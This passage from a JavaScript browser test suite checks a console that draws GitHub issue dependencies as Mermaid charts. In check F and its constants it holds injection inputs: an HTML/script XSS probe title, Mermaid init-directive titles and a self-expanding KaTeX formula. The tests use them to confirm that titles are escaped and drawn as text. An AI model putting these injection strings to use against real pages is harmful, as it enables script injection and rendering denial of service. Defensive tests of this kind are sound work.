    scroll: [host.scrollLeft, host.scrollTop], overflow: getComputedStyle(host).overflow, touch: getComputedStyle(host).touchAction,
  };
}, sel || null);
// a picture drawn whole on its stage: every node inside the stage and none under the tools floating
// over its corner; never larger than cap times its natural size (1 for a chart, 2 for a focus); and
// fitted, at that most or touching the stage's padding (12 px) on one side or the other, and, where
// no tools float over the stage, centred both ways
// the scale a stage fits its picture whole at and the part of it the picture is fitted to, as the
// stage reckons them: its box less 12 px each side, or, where the card's tools float over its corner,
// the part below them or the part beside them, whichever draws the picture larger
function fitOf(s, cap) {
  const W = s.box[0], H = s.box[1];
  const scale = (r) => (r.w > 24 && r.h > 24 ? Math.min((r.w - 24) / s.w, (r.h - 24) / s.h, cap) : 0);
  const all = { x: 0, y: 0, w: W, h: H };
  if (!s.corner) return { k: scale(all), room: all };
  const below = { x: 0, y: s.corner.h, w: W, h: H - s.corner.h }, beside = { x: s.corner.w, y: 0, w: W - s.corner.w, h: H };
  const room = scale(below) >= scale(beside) ? below : beside;
  return { k: scale(room), room };
}
// a picture drawn whole: every node inside its stage and none under the floating tools, at the
// scale that fits it to its room, at most cap, and centred in that room
function assertWhole(s, what, cap) {
  cap = cap || 1;
  assert.ok(s, what + ': no picture on the stage');
  assert.deepEqual(s.outside, [], what + ': a node lies outside the stage: ' + JSON.stringify({ k: s.k, box: s.box, outside: s.outside }));
  assert.deepEqual(s.under, [], what + ': a node is drawn under the card\'s tools');
  assert.ok(s.k > 0 && s.k <= cap + 1e-6, what + ': drawn at ' + s.k + ' times its size, past ' + cap);
  const fit = fitOf(s, cap);
  assert.ok(Math.abs(s.k - fit.k) <= 1e-3 * Math.max(1, fit.k), what + ': not fitted to its stage: ' + JSON.stringify({ k: s.k, fit: fit.k, box: s.box, corner: s.corner }));
  const left = (s.pic.l - s.inner.l) / s.z, top = (s.pic.t - s.inner.t) / s.z, pw = (s.pic.r - s.pic.l) / s.z, ph = (s.pic.b - s.pic.t) / s.z;
  const off = [left + pw / 2 - (fit.room.x + fit.room.w / 2), top + ph / 2 - (fit.room.y + fit.room.h / 2)];
  assert.ok(Math.abs(off[0]) <= 1.5 && Math.abs(off[1]) <= 1.5, what + ': not centred on its stage: ' + JSON.stringify({ off: off.map((v) => Math.round(v * 10) / 10), room: fit.room }));
}
// A focus blows its node up (the owner: "if I select a node it will be blown up"): drawn whole where
// that draws it at least NEAR_GROW times the scale its whole chart was drawn at, and otherwise at that
// scale about its node, which lies inside the stage, centred on it unless an edge of the picture,
// kept 12 px inside the stage's, holds it there
const NEAR_GROW = 1.25;
function assertFocus(s, what, wholeK) {
  assert.ok(s && s.near, what + ': no focus on the stage');
  const fit = fitOf(s, 2), floor = Math.min(2, wholeK * NEAR_GROW);
  if (fit.k >= floor - 1e-6) return assertWhole(s, what, 2);
  assert.ok(Math.abs(s.k - floor) <= 1e-3 * floor, what + ': drawn at ' + s.k + ' where its fit is ' + fit.k + ', not ' + NEAR_GROW + ' times the whole chart\'s ' + wholeK);
  const f = s.nodes.find((g) => g.focal);
  assert.ok(f, what + ': no node is marked as the focus');
  assert.ok(f.l >= s.inner.l - 1 && f.r <= s.inner.r + 1 && f.t >= s.inner.t - 1 && f.b <= s.inner.b + 1, what + ': the focus\'s own node runs past its stage');
  const room = fit.room, z = s.z;
  const mid = [s.inner.l + (room.x + room.w / 2) * z, s.inner.t + (room.y + room.h / 2) * z];
  const held = [[s.pic.l - s.inner.l, s.inner.r - s.pic.r], [s.pic.t - s.inner.t, s.inner.b - s.pic.b]].map((p) => p.some((v) => Math.abs(v / z - 12) <= 1.5));
  assert.ok((Math.abs(f.x - mid[0]) / z <= 1.5 || held[0]) && (Math.abs(f.y - mid[1]) / z <= 1.5 || held[1]), what + ': the focus is not drawn about its node: ' + JSON.stringify({ node: [f.x, f.y], mid, held }));
}
// where a node of the picture shown is on the screen, by its number
const nodeAt = (page, n, sel) => stageRead(page, sel).then((s) => { const x = s && s.nodes.find((g) => g.n === n); assert.ok(x, '#' + n + ' is not drawn on the stage'); return { x: x.x, y: x.y }; });
// the middle of a stage on the screen
const stageMid = (page, sel) => stageRead(page, sel).then((s) => ({ x: (s.inner.l + s.inner.r) / 2, y: (s.inner.t + s.inner.b) / 2 }));
// the focus open on the card shown: its number, the nodes and edges its picture draws, the node marked
// as the focus, and its card's words, link and button
const nearRead = (page, scope) => page.evaluate((scope) => {
  const sec = scope ? document.querySelector(scope) : Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
  const card = sec.querySelector('.graph__near'), svg = sec.querySelector('.control__chart > svg.graph__nearsvg');
  const whole = Array.from(sec.querySelectorAll('.control__chart > svg')).find((s) => !s.classList.contains('graph__nearsvg'));
  const num = (g) => Number((/-flowchart-i([0-9]+)-/.exec(g.id) || [])[1]);
  const a = card.querySelector('.graph__nearacts a'), b = card.querySelector('.graph__nearacts button');
  return {
    open: !!svg && !card.hidden, whole: whole ? whole.style.display !== 'none' : null,
    nodes: svg ? Array.from(svg.querySelectorAll('g.node')).map(num).sort((x, y) => x - y) : [],
    edges: svg ? svg.querySelectorAll('.edgePaths path').length : 0,
    focal: svg ? Array.from(svg.querySelectorAll('g.node.graph__focal')).map(num) : [],
    num: card.querySelector('.graph__nearnum') ? card.querySelector('.graph__nearnum').textContent : null,
    state: card.querySelector('.graph__nearhead .graph__pill') ? card.querySelector('.graph__nearhead .graph__pill').textContent : null,
    worker: card.querySelector('.graph__nearwho') ? card.querySelector('.graph__nearwho').textContent : null,
    title: card.querySelector('.graph__neartitle') ? card.querySelector('.graph__neartitle').textContent : null,
    titleCut: card.querySelector('.graph__neartitle') ? card.querySelector('.graph__neartitle').scrollHeight > card.querySelector('.graph__neartitle').clientHeight + 1 : null,
    rel: card.querySelector('.graph__nearrel') ? card.querySelector('.graph__nearrel').textContent : null,
    link: a ? [a.textContent, a.getAttribute('href'), a.target, a.rel] : null,
    button: b ? b.textContent : null,
  };
}, scope || null);
const waitNear = (page, n, scope, timeout) => page.waitForFunction(([n, scope]) => {
  const sec = scope ? document.querySelector(scope) : Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
  const num = sec && sec.querySelector('.graph__near:not([hidden]) .graph__nearnum');
  return num && num.textContent === '#' + n && sec.querySelector('.control__chart > svg.graph__nearsvg');
}, [n, scope || null], { timeout: timeout || 8000 });
// two fingers and one, as a touch screen sends them (Chromium's DevTools protocol), on a page opened
// with opts.mobile; each move a step of its own, so the page sees the gesture as it goes
const touchesAt = (cdp, type, points) => cdp.send('Input.dispatchTouchEvent', { type, touchPoints: points.map((p, i) => ({ x: p.x, y: p.y, id: i })) });
async function swipe(cdp, from, to, steps) {
  steps = steps || 6;
  await touchesAt(cdp, 'touchStart', [from]);
  for (let i = 1; i <= steps; i++) await touchesAt(cdp, 'touchMove', [{ x: from.x + (to.x - from.x) * i / steps, y: from.y + (to.y - from.y) * i / steps }]);
  await cdp.send('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
  await sleep(200);
}
async function pinch(cdp, mid, from, to) {
  const at = (d) => [{ x: mid.x - d / 2, y: mid.y }, { x: mid.x + d / 2, y: mid.y }];
  await touchesAt(cdp, 'touchStart', at(from));
  for (let i = 1; i <= 8; i++) await touchesAt(cdp, 'touchMove', at(from + (to - from) * i / 8));
  await cdp.send('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
  await sleep(300);
}
// a drag of the mouse from one point to another, its button held
async function drag(page, from, to, steps) {
  await page.mouse.move(from.x, from.y);
  await page.mouse.down();
  await page.mouse.move(to.x, to.y, { steps: steps || 8 });
  await page.mouse.up();
  await sleep(200);
}
// the tile pressed, the charts shown and the kept choice, read without opening anything
const chosen = (page) => page.evaluate(() => ({
  pressed: Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((b) => b.getAttribute('aria-pressed') === 'true').map((b) => b.getAttribute('data-focus')).join(),
  shown: Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden).map((s) => s.getAttribute('data-focus')).join(),
}));

// the fenced Mermaid blocks of a board's text, the fences dropped
const mermaidBlocks = (text) => [...text.matchAll(/^```mermaid\n([\s\S]*?)\n```$/gm)].map((m) => m[1]);
if (process.env.SYMPHONY_PROTOCOL) {
  await check('A0: the pasted blocks are the library fixture\'s own, as the checkout named holds them', async () => {
    const golden = fs.readFileSync(process.env.SYMPHONY_PROTOCOL + '/tests/fixtures/board-epics-STATE.md', 'utf8');
    assert.deepEqual(mermaidBlocks(golden), [GOALS_TEXT, EPIC_20_TEXT], 'the library\'s fixture moved since ' + FIXTURE_COMMIT + ': paste its blocks again');
  });
} else console.log('SKIP A0: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; the pasted blocks are from ' + FIXTURE_COMMIT);

// Check F's epic #41: a hostile title, four that spell a Mermaid directive, %%{ ... }%%, which
// Mermaid looks for anywhere in the text before it reads the entities, two holding $$...$$, which
// Mermaid typesets as math and which stopped the whole chart from drawing where the formula did not
// parse, and four the board folds to ASCII, among them the small and fullwidth percent and dollar
// signs that the fold turns into the plain ones before they are written as entities. The board
// writes "%" as #37; since symphony-protocol 34c5586 and "$" as #36; since 468fc44, as the page's
// graphLabel does, so the block below is what the library at FIXTURE_COMMIT writes for these titles
// (board.mermaid_block over them, all labelled todo, with no relation), and check A1 renders it
// again with the checkout named.
const HOSTILE = '<img src=x onerror=alert(1)> "] <script>alert(2)</script> and more';
const PERCENT_TITLES = { 43: '%%{init:{ broken', 44: '%%{init:{"theme":"dark"}}%% x', 45: 'Opens %%{init', 46: 'closes it }%% later' };
const DOLLAR_TITLES = { 47: '$$\\def\\x{\\x\\x}\\x$$', 48: 'Pay $$5 or $$ more' };
// each title the board folds, and the text its node shows once Mermaid has read the entities
const FOLDED_TITLES = {
  49: ['Caf\u00e9 na\u00efve \u2460 \ufb01le', '#49 Cafe naive 1 file'],
  51: ['a \uff05\uff05{init} \ufe6a b \uff04\uff04x\ufe69\ufe69', '#51 a %%{init} % b $$x$$'],
  52: ['\u65e5\u672c \u2163 x y z', '#52 IV x y z'],
  53: ['e\u0301\u0301 \u00c5', '#53 e A'],
};
const F_TITLES = Object.assign({ 42: HOSTILE }, PERCENT_TITLES, DOLLAR_TITLES, Object.fromEntries(Object.entries(FOLDED_TITLES).map(([n, t]) => [n, t[0]])));
const F_EPIC_41_TEXT = [
  'flowchart TD',
  '  i42["#42 #lt;img src=x onerror=alert(1)#gt; #quot;] #lt;scri..."]:::todo',
  '  i43["#43 #37;#37;{init:{ broken"]:::todo',
  '  i44["#44 #37;#37;{init:{#quot;theme#quot;:#quot;dark#quot;}}#37;#37; x"]:::todo',
  '  i45["#45 Opens #37;#37;{init"]:::todo',
  '  i46["#46 closes it }#37;#37; later"]:::todo',
  '  i47["#47 #36;#36;\\def\\x{\\x\\x}\\x#36;#36;"]:::todo',
  '  i48["#48 Pay #36;#36;5 or #36;#36; more"]:::todo',
  '  i49["#49 Cafe naive 1 file"]:::todo',
  '  i51["#51 a #37;#37;{init} #37; b #36;#36;x#36;#36;"]:::todo',
  '  i52["#52 IV x y z"]:::todo',
  '  i53["#53 e A"]:::todo',
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
].join('\n');
// the block the library checkout named writes for the issues given, number to title, labels, state
// and the sub-issues' progress: board.mermaid_block over them, with no relation
function libraryBlock(issues) {
  const code = 'import json, sys\nfrom sdlc_protocol import board\nspec = json.loads(sys.argv[1])\n' +
    'print(board.mermaid_block([board.Issue(int(n), s["title"], labels=s["labels"], state=s.get("state", "open"), progress=tuple(s["progress"]) if s.get("progress") else None) for n, s in spec.items()], [], set()))\n';
  const out = execFileSync('python3', ['-c', code, JSON.stringify(issues)], { cwd: process.env.SYMPHONY_PROTOCOL, encoding: 'utf8' });
  return mermaidBlocks(out.trimEnd());
}
if (process.env.SYMPHONY_PROTOCOL) {
  await check('A1: the block pasted for check F\'s titles is the library\'s own, as the checkout named renders it', async () => {
    const issues = Object.fromEntries(Object.entries(F_TITLES).map(([n, title]) => [n, { title, labels: ['todo'] }]));
    assert.deepEqual(libraryBlock(issues), [F_EPIC_41_TEXT], 'the library writes these titles otherwise since ' + FIXTURE_COMMIT + ': paste its block again');
  });
} else console.log('SKIP A1: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; the pasted block is from ' + FIXTURE_COMMIT);

await check('A: the chart text handed to the drawing is byte for byte the board\'s two blocks for the fixture', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  const charts = await page.evaluate(() => window.__charts);
  const init = await page.evaluate(() => window.__init);
  console.log('     charts handed:', charts.length, '| headings:', JSON.stringify(await headings(page)), '| init:', JSON.stringify(init));
  assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)']);
  assert.equal(init.securityLevel, 'strict');
  assert.equal(init.startOnLoad, false);
  // no directive may change these, the sanitizer's settings, the styles and the fonts among them,
  // which could fetch from elsewhere: the second line of defence behind graphLabel's escapes
  assert.deepEqual(init.secure, ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize', 'suppressErrorRendering', 'maxEdges',
    'dompurifyConfig', 'themeCSS', 'themeVariables', 'fontFamily', 'altFontFamily']);
  // the console's look: Mermaid's own neo look in the deck's colours, its labels wrapped at 190 px
  // (the neo look turns its arrows at rounded corners whatever curve is asked, so none is)
  assert.deepEqual([init.look, init.theme, init.themeVariables && init.themeVariables.darkMode, init.themeVariables && init.themeVariables.lineColor, init.flowchart && init.flowchart.wrappingWidth, init.flowchart && init.flowchart.curve], ['neo', 'base', true, '#8A9E97', 190, undefined]);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('B: exactly one sub_issues read per open epic or goal with sub-issues, one blocked_by read per sub-issue of an epic whose summary counts a blocker, and nothing written', async () => {
  const f = fixture();
  // an epic whose summary says no sub-issue owes no read; a goal's children, the epics, get no blocked_by read
  f.open.push(issue(40, 'An epic with nothing under it yet', ['epic'], subs(0, 0)));
  const { context, page, calls, errors } = await open(fixtureRoutes(f), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  await sleep(500);
  console.log('     reads:', JSON.stringify(dependencyReads(calls)), '| writes:', JSON.stringify(writes(calls)));
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS);
  assert.deepEqual(writes(calls), []);
  for (const c of calls) assert.equal(c.auth, 'Bearer github_pat_TEST', 'a call without the token: ' + c.key);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('C: the vendored Mermaid, loaded once from the site, draws both charts with their nodes and classes while the tab is hidden, and they show whole once it opens', async () => {
  const { context, page, errors, requests } = await open(fixtureRoutes(fixture()));
  // the console opens on its first tab, so the charts are drawn into the hidden Dependencies tab
  await signIn(page, null);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const drawnHidden = await page.evaluate(() => document.getElementById('tab-dependencies').hidden);
  await toTab(page, 'dependencies');
  // the focus strip shows one chart at a time; show every chart so this check sees both whole
  await page.click('#cp-graph-focus button[data-focus="all"]');
  const svgs = await page.$$eval('#cp-graph .control__chart svg', (list) => list.map((svg) => ({
    nodes: Array.from(svg.querySelectorAll('g.node')).map((g) => {
      const label = g.querySelector('foreignObject, text');
      return { id: g.id, classes: g.getAttribute('class'), text: g.textContent.trim(), width: g.getBoundingClientRect().width, labelWidth: label ? label.getBoundingClientRect().width : 0 };
    }),
    edges: svg.querySelectorAll('.edgePaths path').length,
    minWidth: svg.style.minWidth,
    size: [svg.getBoundingClientRect().width, svg.getBoundingClientRect().height],
  })));
  console.log('     drawn while hidden:', drawnHidden, '| vendor loads:', vendorLoads(requests), '| charts:', svgs.length, '| nodes:', svgs.map((s) => s.nodes.length).join(','), '| sizes:', JSON.stringify(svgs.map((s) => s.size.map(Math.round))), '| first node:', JSON.stringify(svgs[0] && svgs[0].nodes[0]));
  assert.equal(drawnHidden, true, 'the tab was open while the charts were drawn, so this check says nothing of a hidden one');
  assert.ok(svgs.every((s) => s.size[0] > 0 && s.size[1] > 0), 'a chart has no size once its tab opens: ' + JSON.stringify(svgs.map((s) => s.size)));
  assert.ok(svgs.every((s) => s.nodes.every((n) => n.width > 0 && n.labelWidth > 0)), 'a node or its label was laid out with no width: ' + JSON.stringify(svgs.map((s) => s.nodes.map((n) => [n.id, n.width, n.labelWidth]))));
  assert.equal(vendorLoads(requests), 1);
  assert.equal(svgs.length, 2);
  assert.equal(svgs[0].nodes.length, 2);
  assert.equal(svgs[1].nodes.length, 4);
  assert.equal(svgs[0].edges, 1);
  assert.equal(svgs[1].edges, 3);
  const byNumber = (nodes, n) => nodes.find((x) => new RegExp('-flowchart-i' + n + '-[0-9]+$').test(x.id));
  assert.match(byNumber(svgs[0].nodes, 30).classes, /\btodo\b/);
  assert.ok(!/\b(todo|claimed|review|blocked|closed)\b/.test(byNumber(svgs[0].nodes, 20).classes), 'the epic under its goal is drawn plain: ' + byNumber(svgs[0].nodes, 20).classes);
  assert.match(byNumber(svgs[1].nodes, 21).classes, /\bclosed\b/);
  assert.match(byNumber(svgs[1].nodes, 22).classes, /\bclaimed\b/);
  assert.match(byNumber(svgs[1].nodes, 23).classes, /\btodo\b/);
  assert.equal(byNumber(svgs[1].nodes, 23).text, '#23 Write the body | with "quotes" and <t...');
  assert.equal(byNumber(svgs[0].nodes, 20).text, '#20 Draw the board (1/3)');
  assert.ok(svgs.every((s) => /px$/.test(s.minWidth)), 'a chart keeps its own width: ' + svgs.map((s) => s.minWidth));
  // the arrows and the chart's words must read on the chart's own ground, a shade off the deck's
  const contrast = await chartContrast(page, '#cp-graph');
  console.log('     contrast on the ground:', JSON.stringify(contrast));
  assertContrast(contrast);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('D: a node pressed opens it in focus in this tab, and its Centre its row opens the Tasks tab with the task\'s row centred and marked inside that tab\'s box, says so on the message line, leaves the window where it was, and opens nothing; a row of the list does the same and opens that issue\'s focus', async () => {
  const { context, page, errors, opened } = await open(fixtureRoutes(fixture()));
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await page.evaluate(() => { window.__scrolled.length = 0; });
  const before = await where(page);
  assert.deepEqual([before.hash, before.shown, before.y], ['#dependencies', ['dependencies'], 0]);
  assert.ok(before.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
  // the tiles show the first chart (Goals); #22 is in the epic's
  await page.click('#cp-graph-focus button[data-focus="epic-20"]');
  await page.click('#cp-graph g.node[id*="-flowchart-i22-"]');
  await waitNear(page, 22);
  const pressed = await where(page);
  const near = await nearRead(page);
  console.log('     after the press:', JSON.stringify(pressed), '| focus:', JSON.stringify([near.num, near.nodes, near.button]));
  assert.deepEqual([pressed.hash, pressed.shown, pressed.y], ['#dependencies', ['dependencies'], 0], 'the press left the tab or moved the window');
  assert.deepEqual([near.open, near.num, near.button], [true, '#22', 'Centre its row']);
  assert.equal(await page.$$eval('#cp-app tr.control__focus', (rows) => rows.length), 0, 'the press centred a row before Centre its row was pressed');
  // the deck fills the window from its top, so a row centred in its box lies where a window at its
  // own top could only move up to centre it, which it cannot: the window is put 40 px down the
  // room the check gave the page, where a move either way shows, and pressed where it stands, as a
  // finger presses it, with nothing of the check's own scrolling it into view
  const offset = await page.evaluate(() => { window.scrollTo({ top: 40, behavior: 'instant' }); return window.pageYOffset; });
  assert.equal(offset, 40, 'the window could not be put down the check\'s room, so this says nothing');
  await page.$eval('#cp-graph .graph__section[data-focus="epic-20"] .graph__nearacts button', (b) => b.click());
  // read at once, before any call that would open a tab itself
  const after = await where(page);
  await sleep(800);
  const settled = await where(page);
  const view = await inBox(page, '#cp-claimed tr[data-number="22"]');
  console.log('     after Centre its row:', JSON.stringify(after), '| a moment later:', settled.y, '| row:', view);
  assert.deepEqual([after.hash, after.shown, after.y], ['#tasks', ['tasks'], 40], 'Centre its row did not open the Tasks tab alone, or moved the window');
  assert.equal(settled.y, 40, 'the window moved once the press settled');
  assert.equal(view, 'in view');
  await page.evaluate(() => window.scrollTo({ top: 0, behavior: 'instant' }));
  await page.waitForSelector('#cp-claimed tr[data-number="22"].control__focus', { timeout: 8000 });
  const said = await page.textContent('#cp-graph-said');
  const scrolled = await page.evaluate(() => window.__scrolled);
  console.log('     said:', said, '| message line:', await msgText(page), '| scrolled:', JSON.stringify(scrolled), '| pages:', context.pages().length);
  assert.equal(said, 'Focused #22 (under Claimed).');
  // the said line is in the Dependencies tab, which the press hid, and the words are on the message line too
  assert.equal(await msgText(page), 'Focused #22 (under Claimed).');
  assert.ok(scrolled.some((s) => /^TR:#22/.test(s)), 'the row was not centred: ' + JSON.stringify(scrolled));
  assert.deepEqual(opened.map((p) => p.url()), []);
  assert.equal(context.pages().length, 1);
  assert.equal(await page.$$eval('#cp-app tr.control__focus', (rows) => rows.length), 1);
  // the list, shown in the chart's place by the card's List, from the Dependencies tab opened again
  // by its rail button: hidden before it is pressed and shown after, so a list already shown fails
  // here and not as a wait on a hidden button
  await toTab(page, 'dependencies');
  const listOf = () => page.$eval('#cp-graph .graph__section[data-focus="epic-20"] .graph__list', (d) => !d.hidden);
  assert.equal(await listOf(), false, 'the list was shown before List was pressed');
  await page.click('#cp-graph .graph__section[data-focus="epic-20"] .graph__view[data-view="list"]');
  assert.equal(await listOf(), true, 'the list did not show');
  assert.equal((await where(page)).y, 0, 'showing the list moved the window');
  await page.click('#cp-graph tr:has(a[href$="/issues/23"]) button');
  const centred = await where(page);
  await sleep(800);
  const centredLater = await where(page);
  const view23 = await inBox(page, '#cp-queue tr[data-number="23"]');
  console.log('     after a row\'s Centre its row:', JSON.stringify(centred), '| a moment later:', centredLater.y, '| row:', view23);
  assert.deepEqual([centred.hash, centred.shown, centred.y, centredLater.y], ['#tasks', ['tasks'], 0, 0]);
  assert.equal(view23, 'in view');
  await page.waitForFunction(() => /#23/.test(document.getElementById('cp-graph-said').textContent), null, { timeout: 8000 });
  assert.equal(await page.textContent('#cp-graph-said'), 'Focused #23 (under Queue).');
  assert.equal(await msgText(page), 'Focused #23 (under Queue).');
  await page.waitForSelector('#cp-queue tr[data-number="23"].control__focus', { timeout: 8000 });
  // back in the tab, the card shows its chart again with #23 in focus, where the person left off
  await toTab(page, 'dependencies');
  await waitNear(page, 23);
  const back = await page.$eval('#cp-graph .graph__section[data-focus="epic-20"]', (sec) => [sec.getAttribute('data-view'), sec.querySelector('.graph__list').hidden]);
  console.log('     the card once back:', JSON.stringify(back));
  assert.deepEqual(back, ['chart', true], 'the row\'s button did not bring the card back to its chart');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('E: when the drawing script cannot be loaded, each card shows its list in the chart\'s place, its Chart switch turned off, the key is hidden and the state says so', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [missingRoute] });
  await signIn(page);
  await waitGraph(page, /^The charts could not be drawn \(the drawing script could not be loaded/);
  const state = await stateText(page);
  const tables = await page.$$eval('#cp-graph table', (ts) => ts.map((t) => t.querySelectorAll('tbody tr').length));
  console.log('     state:', state.slice(0, 120), '| tables:', JSON.stringify(tables), '| svgs:', await page.$$eval('#cp-graph svg', (l) => l.length));
  assert.deepEqual(tables, [2, 4]);
  assert.equal(await page.$$eval('#cp-graph svg', (l) => l.length), 0);
  // each list, shown in its chart's place, stands alone where the charts cannot be drawn, and the
  // card's Chart switch says there is no chart to switch to
  const cards = await page.$$eval('#cp-graph .graph__section', (secs) => secs.map((sec) => [sec.getAttribute('data-view'), sec.querySelector('.graph__list').hidden, sec.querySelector('.control__chart').hidden, sec.querySelector('.graph__view[data-view="chart"]').disabled]));
  console.log('     cards (view, list hidden, chart hidden, Chart off):', JSON.stringify(cards));
  assert.deepEqual(cards, [['list', false, true, true], ['list', false, true, true]]);
  // the key is for charts, and none was drawn
  assert.equal(await page.evaluate(() => document.getElementById('cp-graph-key').hidden), true, 'the key is shown with no chart drawn');
  assert.match(state, /the lists say the same from 4 reads of GitHub: 1 goal and 1 epic with sub-issues\.$/);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)']);
  assert.deepEqual(errors, []);
  await context.close();
});

// Check F's repository: the fixture and epic #41 over the titles above (before A1): among the "%"
// ones, one opening a directive, one holding a whole one, and a pair that opens one and closes it in
// a later node, each of which broke the chart or erased what lay between before the "%" went as an
// entity; a formula KaTeX cannot parse, which stopped the chart before the "$" did; and the folded
// ones. The epic's own title is folded in its heading as the board folds it.
function scenarioF() {
  const f = fixture();
  const children = Object.entries(F_TITLES).map(([n, title]) => issue(Number(n), title, ['todo']));
  f.open.push(issue(41, 'An epic " with a quote, d\u00e9j\u00e0 vu', ['epic'], subs(0, children.length)), ...children);
  f.subIssues[41] = children;
  return fixtureRoutes(f);
}
await check('F: a hostile title is drawn as text, makes no element, runs nothing and fetches nothing', async () => {
  const hostile = HOSTILE;
  const { context, page, errors, requests, dialogs } = await open(scenarioF());
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 5 reads/, 15000);
  await sleep(500);
  const node = await page.$eval('#cp-graph g.node[id*="-flowchart-i42-"]', (g) => ({ text: g.textContent.trim(), html: g.innerHTML }));
  const elements = await page.$$eval('#cp-graph script, #cp-graph img, #cp-graph [onerror], #cp-graph [onload]', (l) => l.length);
  const cell = await page.textContent('#cp-graph tr:has(a[href$="/issues/42"]) td:nth-child(2)');
  console.log('     node text:', JSON.stringify(node.text), '| elements:', elements, '| dialogs:', JSON.stringify(dialogs), '| x fetched:', requests.filter((u) => /\/x$/.test(u)).length);
  assert.equal(node.text, '#42 <img src=x onerror=alert(1)> "] <scri...');
  assert.equal(elements, 0);
  assert.ok(!/<img|<script/i.test(node.html), 'a tag inside the node: ' + node.html.slice(0, 200));
  assert.deepEqual(dialogs, []);
  assert.equal(requests.filter((u) => /\/x$/.test(u)).length, 0);
  assert.equal(cell, hostile);
  assert.deepEqual((await headings(page)).slice(-1), ['Epic #41: An epic " with a quote, deja vu (0/11)']);
  // every chart drawn, epic #41's despite its formulas, each "%" and "$" title shown whole in its
  // node, as words and not as math, and each folded one as the board folds it
  assert.equal(await page.$$eval('#cp-graph .control__chart svg', (l) => l.length), 3);
  assert.equal(await page.$$eval('#cp-graph math, #cp-graph .katex', (l) => l.length), 0, 'a title was typeset as math');
  for (const [n, title] of Object.entries(Object.assign({}, PERCENT_TITLES, DOLLAR_TITLES))) {
    const text = await page.$eval('#cp-graph g.node[id*="-flowchart-i' + n + '-"]', (g) => g.textContent.trim());
    assert.equal(text, '#' + n + ' ' + title);
  }
  for (const [n, [, shown]] of Object.entries(FOLDED_TITLES)) {
    const text = await page.$eval('#cp-graph g.node[id*="-flowchart-i' + n + '-"]', (g) => g.textContent.trim());
    assert.equal(text, shown);
  }
  assert.deepEqual(errors, []);
  await context.close();
});

await check('F2: the text handed the drawing for a hostile title, the "%" and "$" titles and the folded ones is byte for byte the board\'s block, with no "%" or "$" left in it', async () => {
  const { context, page, errors } = await open(scenarioF(), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 5 reads/);
  const charts = await page.evaluate(() => window.__charts);
  console.log('     epic #41 handed:', JSON.stringify(charts[2] && charts[2].split('\n').slice(1, 6)));
  assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT, F_EPIC_41_TEXT]);
  assert.ok(charts.every((text) => !text.includes('%')), 'a "%" reached the drawing');
  assert.ok(charts.every((text) => !text.includes('$')), 'a "$" reached the drawing');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G1: a 403 on a sub_issues read is said in words and nothing is drawn', async () => {
  const routes = fixtureRoutes(fixture());
  routes['GET /repos/acme/demo/issues/20/sub_issues'] = resp(403, { message: 'Resource not accessible by personal access token' });
  const { context, page, errors, requests } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: reading the sub-issues of #20 failed\. The token may not do this \(403/);
  await sleep(300);
  console.log('     state:', (await stateText(page)).slice(0, 140), '| children:', await page.$$eval('#cp-graph > *', (l) => l.length), '| vendor loads:', vendorLoads(requests));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.equal(vendorLoads(requests), 0);
  assert.match(await page.textContent('#cp-summary'), /Not read: the dependencies/);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G2: the rate limit reached (429) on a blocked_by read is said in words and nothing is half drawn', async () => {
  const routes = fixtureRoutes(fixture());
  routes['GET /repos/acme/demo/issues/23/dependencies/blocked_by'] = resp(429, { message: 'API rate limit exceeded' });
  const { context, page, errors } = await open(routes);
  await signIn(page);
  await waitGraph(page, /^Not drawn: reading the issues blocking #23 failed\. GitHub's rate limit for this token is reached \(429\)/);
  await sleep(300);
  console.log('     state:', (await stateText(page)).slice(0, 140), '| children:', await page.$$eval('#cp-graph > *', (l) => l.length));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('G3: the cap on reads stops the draw before the read past it, said in words', async () => {
  const { context, page, calls, errors } = await open(fixtureRoutes(fixture()), { constants: { GRAPH_READS_MAX: 2 } });
